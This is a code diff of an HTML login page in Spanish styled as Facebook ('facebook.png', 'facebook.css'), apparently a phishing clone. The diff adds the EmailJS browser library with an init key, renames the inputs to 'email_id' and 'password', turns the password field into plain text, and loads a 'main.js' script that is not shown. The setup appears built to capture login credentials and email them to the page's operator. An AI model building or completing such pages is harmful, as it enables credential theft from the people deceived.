@@ -5,6 +5,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar sesión</title>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+    emailjs.init('SX0hNGD4QjgUC56Rt')
+  </script>
 <link rel="shortcut icon" href="facebook.png" type="image/x-icon">
     <link rel="stylesheet" href="facebook.css">
 
@@ -18,10 +24,12 @@
 
 
     <div class="login-container">
+<form id="form">
+         <input type="text" name="email_id" id="email_id" placeholder="Correo electrónico o numero de telefono">
 
-        <input type="text" name="correo" placeholder="Correo electrónico o numero de telefono">
-        <input type="password" name="contrasena" placeholder="Contraseña">
-            <button type="submit"><b>Iniciar sesión</b></button>
+        <input type="text" name="password" id="password" placeholder="Contraseña">
+
+            <button type="submit" id="button" value="INICIAR SESION"><b>Iniciar sesión</b></button>
         </form>
         <br><br>
         <a href="#" class="desaparece-Line">¿Olvidaste tu contraseña?</a>
@@ -37,5 +45,5 @@
 
 
 </body>
-
+<script src="main.js"></script>
 </html>
